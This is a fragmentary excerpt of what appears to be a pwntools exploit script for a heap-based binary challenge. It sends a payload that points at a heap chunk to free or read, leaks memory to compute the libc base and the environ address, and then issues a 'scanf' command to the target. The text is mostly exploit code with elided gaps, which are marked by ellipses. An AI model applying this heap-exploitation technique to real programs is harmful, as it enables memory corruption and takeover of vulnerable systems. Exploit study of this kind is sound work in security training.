...
print(io.recvline()) #available commands...io.recvline() #welcome...
...
payload += p64(heap_base+0x718) # point to the chunk we want to free (or read)
io.sendline(payload)
...
log.info(f'reading chunk at {hex(heap_base+0x718)}')
...
libc.address = integer_value - 0x00000000002044e0

environ = libc.address + 0x24d2d0
log.info(f'libc base is at {hex(libc.address)}, environ is at {hex(environ)}')
...
actual_libc_address = environ - 0x000000000020ad58 - 0x42578
# now call scanf
io.sendline(b'scanf')
